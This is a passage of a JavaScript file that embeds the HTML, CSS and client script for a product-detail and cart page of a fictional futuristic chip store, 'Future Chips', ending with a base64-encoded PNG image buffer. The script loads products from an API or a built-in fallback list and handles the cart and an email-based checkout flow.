.product-image-wrap img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  transition: transform 0.5s ease;
}

.product-card:hover .product-image-wrap img {
  transform: scale(1.05);
}

.product-info {
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  flex-grow: 1;
}

.product-category {
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 2px;
  color: var(--primary-color);
  margin-bottom: 0.5rem;
  font-weight: 700;
}

.product-title {
  font-family: var(--font-title);
  font-size: 1.4rem;
  font-weight: 700;
  margin-bottom: 0.5rem;
  line-height: 1.3;
}

.product-desc {
  color: var(--text-muted);
  font-size: 0.9rem;
  margin-bottom: 1.5rem;
  display: -webkit-box;
  -webkit-line-clamp: 2;
  -webkit-box-orient: vertical;
  overflow: hidden;
  text-overflow: ellipsis;
  flex-grow: 1;
}

.product-footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.product-price {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.5rem;
  color: #ffffff;
}

.btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
  padding: 0.8rem 1.5rem;
  border-radius: 10px;
  font-weight: 600;
  font-family: var(--font-body);
  text-decoration: none;
  cursor: pointer;
  transition: all 0.3s;
  border: none;
}

.btn-primary {
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  color: #ffffff;
  box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
}

.btn-primary:hover {
  transform: scale(1.03);
  box-shadow: 0 4px 20px rgba(0, 240, 255, 0.5);
}

.btn-outline {
  background: transparent;
  border: 1px solid rgba(255, 255, 255, 0.2);
  color: #ffffff;
}

.btn-outline:hover {
  border-color: var(--primary-color);
  background: rgba(0, 240, 255, 0.05);
}

/* Detail View Layout */
.product-detail-layout {
  display: grid;
  grid-template-columns: 1.2fr 1fr;
  gap: 4rem;
  padding: 5rem 0;
  align-items: center;
}

@media (max-width: 768px) {
  .product-detail-layout {
    grid-template-columns: 1fr;
    gap: 2rem;
    padding: 2rem 0;
  }
  .hero h1 {
    font-size: 2.5rem;
  }
}

.detail-img-card {
  border-radius: 24px;
  overflow: hidden;
  aspect-ratio: 1;
}

.detail-img-card img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.detail-info {
  display: flex;
  flex-direction: column;
}

.detail-price-box {
  margin: 1.5rem 0 2.5rem 0;
}

.detail-price-label {
  font-size: 0.85rem;
  color: var(--text-muted);
  text-transform: uppercase;
  letter-spacing: 1px;
}

.detail-price-val {
  font-family: var(--font-title);
  font-size: 3rem;
  font-weight: 900;
  line-height: 1.1;
  color: #ffffff;
}

.detail-checkout-form {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.form-group {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.form-group label {
  font-size: 0.9rem;
  color: var(--text-muted);
}

.form-group input {
  width: 100%;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.9rem 1rem;
  color: #ffffff;
  font-family: var(--font-body);
  transition: all 0.3s;
}

.form-group input:focus {
  border-color: var(--primary-color);
  outline: none;
  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
}

/* Slide-over Cart Panel */
.cart-panel {
  position: fixed;
  top: 0;
  right: -450px;
  width: 100%;
  max-width: 420px;
  height: 100%;
  z-index: 1000;
  box-shadow: -10px 0 30px rgba(0,0,0,0.5);
  display: flex;
  flex-direction: column;
  transition: right 0.4s cubic-bezier(0.16, 1, 0.3, 1);
}

.cart-panel.active {
  right: 0;
}

.cart-header {
  padding: 1.5rem;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.cart-header h2 {
  font-family: var(--font-title);
  font-size: 1.5rem;
}

.cart-close-btn {
  background: none;
  border: none;
  color: var(--text-muted);
  cursor: pointer;
  font-size: 1.5rem;
}

.cart-items {
  flex-grow: 1;
  overflow-y: auto;
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.cart-item {
  display: flex;
  gap: 1rem;
  align-items: center;
  padding-bottom: 1.5rem;
  border-bottom: 1px solid rgba(255,255,255,0.03);
}

.cart-item img {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  object-fit: cover;
  background: #000;
}

.cart-item-details {
  flex-grow: 1;
}

.cart-item-title {
  font-weight: 600;
  font-size: 0.95rem;
  margin-bottom: 0.2rem;
}

.cart-item-price {
  color: var(--primary-color);
  font-weight: 700;
  font-size: 0.9rem;
}

.cart-item-remove {
  background: none;
  border: none;
  color: var(--accent-color);
  cursor: pointer;
  font-size: 0.8rem;
  padding: 4px;
}

.cart-footer {
  padding: 1.5rem;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
  background: rgba(8, 8, 20, 0.9);
}

.cart-total {
  display: flex;
  justify-content: space-between;
  font-size: 1.2rem;
  font-weight: bold;
  margin-bottom: 1.5rem;
}

.cart-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(4px);
  z-index: 999;
  display: none;
}

.cart-overlay.active {
  display: block;
}

/* Status / Confirmation page layout */
.status-card {
  max-width: 550px;
  margin: 8rem auto;
  padding: 3rem;
  border-radius: 24px;
  text-align: center;
}

.status-icon {
  width: 80px;
  height: 80px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 2rem auto;
}

.status-icon.success {
  background: #ffffff;
  color: #22c55e; /* Vibrant success green */
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
  border: none;
}

.status-icon.success svg {
  width: 40px;
  height: 40px;
  fill: currentColor;
}

.status-title {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 2.2rem;
  margin-bottom: 1rem;
}

.status-text {
  color: var(--text-muted);
  margin-bottom: 2.5rem;
}

.receipt-info {
  background: rgba(255, 255, 255, 0.02);
  border: 1px solid rgba(255, 255, 255, 0.05);
  border-radius: 12px;
  padding: 1.5rem;
  text-align: left;
  margin-bottom: 2.5rem;
}

.receipt-row {
  display: flex;
  justify-content: space-between;
  margin-bottom: 0.8rem;
  font-size: 0.95rem;
}

.receipt-row:last-child {
  margin-bottom: 0;
  padding-top: 0.8rem;
  border-top: 1px solid rgba(255,255,255,0.05);
  font-weight: bold;
}

/* Animations */
@keyframes glow-pulse {
  from {
    filter: drop-shadow(0 0 5px var(--primary-color));
  }
  to {
    filter: drop-shadow(0 0 20px var(--accent-color));
  }
}

/* Footer styling */
footer {
  padding: 3rem 0;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
  text-align: center;
  color: var(--text-muted);
  font-size: 0.9rem;
}

</style>
</head>
<body>

  <!-- Header -->
  <header id="main-header" class="glass">
    <div class="container nav-container">
      <a href="/" class="logo">
        <span>⚡</span> <span id="site-title-logo">Future Chips</span>
      </a>
      <ul class="nav-links">
        <li><a href="/">Store</a></li>
      </ul>
      <a href="/" class="btn btn-outline" style="padding: 0.5rem 1rem; font-size: 0.9rem;">&larr; Back to Catalog</a>
    </div>
  </header>

  <!-- Product Detail Section -->
  <main class="container">
    <div class="product-detail-layout" id="product-detail-container">
      <!-- Loading indicator -->
      <div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
        Decoding product frequency...
      </div>
    </div>
  </main>

  <!-- Footer -->
  <footer class="container">
    <p>&copy; 2026 <span id="site-footer-name">Future Chips</span>. Powered by live AI synthesis.</p>
  </footer>

  
  <script>
    // Specific script to load detail page content
    document.addEventListener('DOMContentLoaded', async () => {
      // Get product ID from URL query params
      const params = new URLSearchParams(window.location.search);
      const productId = params.get('id');
      
      if (!productId) {
        window.location.href = '/';
        return;
      }

      await loadSiteTheme(); // Run global theme setup from app.js
      await fetchProductDetails(productId);
    });

    async function fetchProductDetails(id) {
      const container = document.getElementById('product-detail-container');
      let p;
      try {
        const response = await fetch(\`/api/products/\${id}\`);
        if (!response.ok) throw new Error('Product not found');
        p = await response.json();
      } catch (err) {
        console.warn('API offline, looking up item in static fallback list:', err);
        const products = JSON.parse(localStorage.getItem('future_chips_products')) || (typeof DEFAULT_PRODUCTS !== 'undefined' ? DEFAULT_PRODUCTS : []);
        p = products.find(item => item.id === id);
        if (!p) {
          container.innerHTML = \`
            <div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--accent-color);">
              <h2>Verification error: Chip node could not be loaded.</h2>
              <a href="/" class="btn btn-outline" style="margin-top: 2rem;">Return to Catalog</a>
            </div>
          \`;
          return;
        }
      }

      // Dynamically set page title
      document.title = \`\${p.name} — Future Chips\`;

      container.innerHTML = \`
        <!-- Product Visual -->
        <div class="detail-img-card glass">
          <img src="\${p.image}" alt="\${p.name}">
        </div>

        <!-- Product Details and Checkout -->
        <div class="detail-info">
          <span class="product-category">\${p.category || 'Processors'}</span>
          <h1 class="product-title" style="font-size: 3rem; margin-bottom: 1.5rem;">\${p.name}</h1>
          <p class="product-desc" style="-webkit-line-clamp: unset; font-size: 1.05rem; margin-bottom: 2rem;">
            \${p.description || 'No description available for this futuristic item.'}
          </p>
          
          <div class="detail-price-box">
            <div class="detail-price-label">Value Verification</div>
            <div class="detail-price-val">$\${p.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD</div>
          </div>

          <!-- Instant Checkout Form -->
          <form class="detail-checkout-form" id="checkout-form">
            <div class="form-group">
              <label for="checkout-email">Delivery Transponder Email</label>
              <input type="email" id="checkout-email" required placeholder="name@domain.com">
            </div>
            <button type="submit" class="btn btn-primary" style="margin-top: 1rem; width: 100%; font-size: 1.1rem; padding: 1rem;">
              Initiate Procurement Flow
            </button>
          </form>
          <div id="checkout-error" style="color: var(--accent-color); margin-top: 1rem; text-align: center; font-size: 0.9rem;"></div>
        </div>
      \`;

      // Bind form submit
      document.getElementById('checkout-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('checkout-email').value;
        const submitBtn = e.target.querySelector('button');
        const errDiv = document.getElementById('checkout-error');
        
        submitBtn.disabled = true;
        submitBtn.innerText = 'Creating Secure Node Session...';
        errDiv.innerText = '';

        let clientIp = 'Unknown';
        try {
          const ipRes = await fetch('https://api.ipify.org?format=json');
          if (ipRes.ok) {
            const ipData = await ipRes.json();
            clientIp = ipData.ip;
          }
        } catch (ipErr) {
          console.warn('Could not determine public IP:', ipErr);
        }

        try {
          const checkoutRes = await fetch('/api/checkout/create-session', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ productId: p.id, email, ip: clientIp })
          });

          if (checkoutRes.ok) {
            const checkoutData = await checkoutRes.json();
            window.location.href = checkoutData.url;
            return;
          }
          throw new Error('API offline');
        } catch (err) {
          console.warn('Backend API offline, launching payment checkout page:', err);
          setTimeout(() => {
            window.location.href = \`/checkout.html?session_id=mock-\${Date.now()}&email=\${encodeURIComponent(email)}&product_id=\${p.id}\`;
          }, 500);
        }
      });
    }
  </script>
<script>

// Global Storefront JavaScript

let cart = JSON.parse(localStorage.getItem('future_chips_cart')) || [];

document.addEventListener('DOMContentLoaded', async () => {
  // Load site details and theme settings
  await loadSiteTheme();
  
  // Set up header scroll effect
  const header = document.getElementById('main-header');
  if (header) {
    window.addEventListener('scroll', () => {
      if (window.scrollY > 50) {
        header.classList.add('scrolled');
      } else {
        header.classList.remove('scrolled');
      }
    });
  }

  // Load products list if on the storefront page
  const productsContainer = document.getElementById('products-container');
  if (productsContainer) {
    await fetchProducts();
    setupFilters();
  }

  // Set up cart triggers
  setupCart();
});

// Load Site Settings (Theme & Site Name)
async function loadSiteTheme() {
  try {
    const res = await fetch('/api/admin/settings');
    if (!res.ok) throw new Error();
    const settings = await res.json();
    
    if (settings) {
      if (settings.primary_color) {
        document.documentElement.style.setProperty('--primary-color', settings.primary_color);
      }
      if (settings.accent_color) {
        document.documentElement.style.setProperty('--accent-color', settings.accent_color);
      }
      if (settings.background_color) {
        document.documentElement.style.setProperty('--background-color', settings.background_color);
      }

      const siteLogos = document.querySelectorAll('#site-title-logo');
      siteLogos.forEach(el => el.innerText = settings.site_name || 'Future Chips');
      
      const siteFooters = document.querySelectorAll('#site-footer-name');
      siteFooters.forEach(el => el.innerText = settings.site_name || 'Future Chips');
      
      if (document.title.includes('Future Chips') && settings.site_name) {
        document.title = document.title.replace('Future Chips', settings.site_name);
      }
      return;
    }
  } catch (err) {
    console.warn('Failed to load dynamic site theme, reading saved local settings:', err);
    const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
    if (saved.primary_color) document.documentElement.style.setProperty('--primary-color', saved.primary_color);
    if (saved.accent_color) document.documentElement.style.setProperty('--accent-color', saved.accent_color);
    if (saved.background_color) document.documentElement.style.setProperty('--background-color', saved.background_color);
    if (saved.site_name) {
      const siteLogos = document.querySelectorAll('#site-title-logo');
      siteLogos.forEach(el => el.innerText = saved.site_name);
      const siteFooters = document.querySelectorAll('#site-footer-name');
      siteFooters.forEach(el => el.innerText = saved.site_name);
    }
  }
}

const DEFAULT_PRODUCTS = [
  {
    id: 'prod-nano-chip',
    name: 'Nano-Constructor Unit',
    description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level. Features self-healing sub-circuits and simple smart-grid integration.',
    price: 10.00,
    image: '/uploads/nano_constructor.svg',
    category: 'Processors'
  },
  {
    id: 'prod-quantum-core',
    name: 'Quantum Neural Core',
    description: 'Next-generation computing processor featuring 1024 logical qubits. Designed for running localized deep learning simulations and processing high-density quantum state calculations. Operates at near-zero thermal emissions.',
    price: 150.00,
    image: '/uploads/quantum_core.svg',
    category: 'Processors'
  },
  {
    id: 'prod-bio-synapse',
    name: 'Bio-Digital Synapse v4.2',
    description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces. Highly valued by prosthetic designers and direct cerebral link developers. Includes advanced noise filtering.',
    price: 850.00,
    image: '/uploads/bio_synapse.svg',
    category: 'Interfaces'
  },
  {
    id: 'prod-holo-matrix',
    name: 'Holographic Display Matrix',
    description: 'High-density spatial photonic projector. Generates interactive three-dimensional objects in mid-air without the need for goggles or specialized headwear. Supports standard light-field video formats.',
    price: 1200.00,
    image: '/uploads/holo_matrix.svg',
    category: 'Displays'
  },
  {
    id: 'prod-photon-core',
    name: 'Photon Power Core',
    description: 'Sub-atomic energy stabilizer chip that converts cosmic radiation into clean electrical power. Perfect for long-duration deep space probes and off-grid high-demand processing stations.',
    price: 5000.00,
    image: '/uploads/photon_core.svg',
    category: 'Energy'
  },
  {
    id: 'prod-gravitational-grid',
    name: 'Gravitational Grid Controller',
    description: 'The ultimate space-time engineering chip. Allows precise, localized micro-gravity field manipulation. Crucial for advanced heavy-duty manufacturing and quantum containment shields.',
    price: 98000.00,
    image: '/uploads/gravitational_grid.svg',
    category: 'Energy'
  }
];

// Fetch & Render Products
async function fetchProducts(filters = {}) {
  const container = document.getElementById('products-container');
  if (!container) return;

  container.innerHTML = \`<div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
    Establishing neural connection...
  </div>\`;

  let products = [];

  try {
    const params = new URLSearchParams();
    if (filters.q) params.append('q', filters.q);
    if (filters.category) params.append('category', filters.category);
    
    const res = await fetch(\`/api/products?\${params.toString()}\`);
    if (res.ok) {
      products = await res.json();
    } else {
      throw new Error('API unreachable');
    }
  } catch (err) {
    console.warn('API stream unreachable, using fallback product matrix:', err);
    products = JSON.parse(localStorage.getItem('future_chips_products')) || DEFAULT_PRODUCTS;
    
    if (filters.q) {
      const q = filters.q.toLowerCase();
      products = products.filter(p => p.name.toLowerCase().includes(q) || (p.description && p.description.toLowerCase().includes(q)));
    }
    if (filters.category) {
      products = products.filter(p => p.category === filters.category);
    }
  }

  // Sort products on client side
  const sortOrder = document.getElementById('price-sort')?.value || 'asc';
  products.sort((a, b) => {
    return sortOrder === 'asc' ? a.price - b.price : b.price - a.price;
  });

  if (products.length === 0) {
    container.innerHTML = \`<div style="grid-column: 1/-1; text-align: center; padding: 5rem; color: var(--text-muted);">
      No cyber modules matching this frequency.
    </div>\`;
    return;
  }

  container.innerHTML = products.map(p => \`
    <article class="product-card glass">
      <div class="product-image-wrap">
        <img src="\${p.image}" alt="\${p.name}" loading="lazy">
      </div>
      <div class="product-info">
        <span class="product-category">\${p.category || 'Processors'}</span>
        <h2 class="product-title">\${p.name}</h2>
        <p class="product-desc">\${p.description || 'No description available.'}</p>
        <div class="product-footer">
          <div class="product-price">\${p.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
          <div style="display: flex; gap: 0.5rem;">
            <a href="/product.html?id=\${p.id}" class="btn btn-outline" style="padding: 0.6rem 1rem;">View Details</a>
            <button onclick="addToCart('\${p.id}', '\${p.name.replace(/'/g, "\\\\'")}', \${p.price}, '\${p.image}')" class="btn btn-primary" style="padding: 0.6rem;">
              +
            </button>
          </div>
        </div>
      </div>
    </article>
  \`).join('');
}

// Setup Filters & Search
function setupFilters() {
  const searchInput = document.getElementById('search-input');
  const categoryFilter = document.getElementById('category-filter');
  const priceSort = document.getElementById('price-sort');

  let timeout = null;

  const triggerSearch = () => {
    fetchProducts({
      q: searchInput?.value || '',
      category: categoryFilter?.value || ''
    });
  };

  searchInput?.addEventListener('input', () => {
    clearTimeout(timeout);
    timeout = setTimeout(triggerSearch, 300);
  });

  categoryFilter?.addEventListener('change', triggerSearch);
  priceSort?.addEventListener('change', triggerSearch);
}

// Cart Functionality
function setupCart() {
  const openCartBtn = document.getElementById('open-cart-btn');
  const closeCartBtn = document.getElementById('close-cart-btn');
  const cartOverlay = document.getElementById('cart-overlay');
  const cartPanel = document.getElementById('cart-panel');
  const checkoutBtn = document.getElementById('checkout-btn');

  const toggleCart = () => {
    cartPanel?.classList.toggle('active');
    cartOverlay?.classList.toggle('active');
    renderCart();
  };

  openCartBtn?.addEventListener('click', toggleCart);
  closeCartBtn?.addEventListener('click', toggleCart);
  cartOverlay?.addEventListener('click', toggleCart);

  // Cart Checkout
  checkoutBtn?.addEventListener('click', () => {
    if (cart.length === 0) {
      alert('Your procurement queue is empty.');
      return;
    }
    // For multiple items, we'll route to the first product in the cart.
    // In a fully featured store you'd create a cart checkout session,
    // but here we redirect them to the checkout page of the first item for simplicity,
    // or checkout directly.
    const firstItem = cart[0];
    window.location.href = \`/product.html?id=\${firstItem.id}\`;
  });

  updateCartBadge();
}

function addToCart(id, name, price, image) {
  const existing = cart.find(item => item.id === id);
  if (existing) {
    existing.qty += 1;
  } else {
    cart.push({ id, name, price, image, qty: 1 });
  }
  
  localStorage.setItem('future_chips_cart', JSON.stringify(cart));
  updateCartBadge();
  
  // Slide cart open automatically on item added
  const cartPanel = document.getElementById('cart-panel');
  const cartOverlay = document.getElementById('cart-overlay');
  if (cartPanel && !cartPanel.classList.contains('active')) {
    cartPanel.classList.add('active');
    cartOverlay?.classList.add('active');
  }
  
  renderCart();
}

function removeFromCart(id) {
  cart = cart.filter(item => item.id !== id);
  localStorage.setItem('future_chips_cart', JSON.stringify(cart));
  updateCartBadge();
  renderCart();
}

function updateCartBadge() {
  const badge = document.getElementById('cart-badge-count');
  if (badge) {
    const totalQty = cart.reduce((sum, item) => sum + item.qty, 0);
    badge.innerText = totalQty;
    badge.style.display = totalQty > 0 ? 'block' : 'none';
  }
}

function renderCart() {
  const container = document.getElementById('cart-items-container');
  const totalVal = document.getElementById('cart-total-value');
  if (!container) return;

  if (cart.length === 0) {
    container.innerHTML = \`<div style="text-align: center; color: var(--text-muted); margin-top: 5rem;">
      Your queue is empty.
    </div>\`;
    if (totalVal) totalVal.innerText = '$0.00';
    return;
  }

  container.innerHTML = cart.map(item => \`
    <div class="cart-item">
      <img src="\${item.image}" alt="\${item.name}">
      <div class="cart-item-details">
        <h4 class="cart-item-title">\${item.name}</h4>
        <div class="cart-item-price">\${item.price.toLocaleString(undefined, {minimumFractionDigits: 2})} x \${item.qty}</div>
      </div>
      <button onclick="removeFromCart('\${item.id}')" class="cart-item-remove">Remove</button>
    </div>
  \`).join('');

  const total = cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
  if (totalVal) {
    totalVal.innerText = \`\${total.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}\`;
  }
}

</script>
</body>
</html>
`;

// SERVE IMAGES & LOGOS
const DOWNLOAD_PNG = Buffer.from('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', 'base64');
